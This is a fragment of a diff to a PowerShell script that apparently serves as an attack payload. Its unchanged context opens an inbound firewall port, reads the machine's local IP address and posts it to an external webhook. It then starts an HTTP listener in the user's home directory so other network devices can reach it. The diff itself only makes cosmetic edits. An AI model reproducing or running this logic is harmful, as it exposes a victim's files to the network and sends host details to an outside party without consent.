@@ -51,7 +51,7 @@ $fpath | Out-File -FilePath "$env:temp/homepath.txt"
 $whuri = "$dc"
 
 New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP –LocalPort 5000 -Action Allow
-$loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi" | Select-Object -ExpandProperty IPAddress
+$loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi*" | Select-Object -ExpandProperty IPAddress
 $hpath = Get-Content -Path "$env:temp/homepath.txt"
 
 $escmsgsys = $loip -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
@@ -62,8 +62,8 @@ Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body
 
 
 cd "$hpath"
-Write-Host "Server Starting at > http://localhost:5000/"
-Write-Host ("Other Network Devices Can Reach it at > http://"+$loip+":5000")
+Write-Host "Server Starting at : http://localhost:5000/"
+Write-Host ("Other Network Devices Can Reach it at : http://"+$loip+":5000")
 $httpsrvlsnr = New-Object System.Net.HttpListener;
 
 $httpsrvlsnr.Prefixes.Add("http://"+$loip+":5000/");
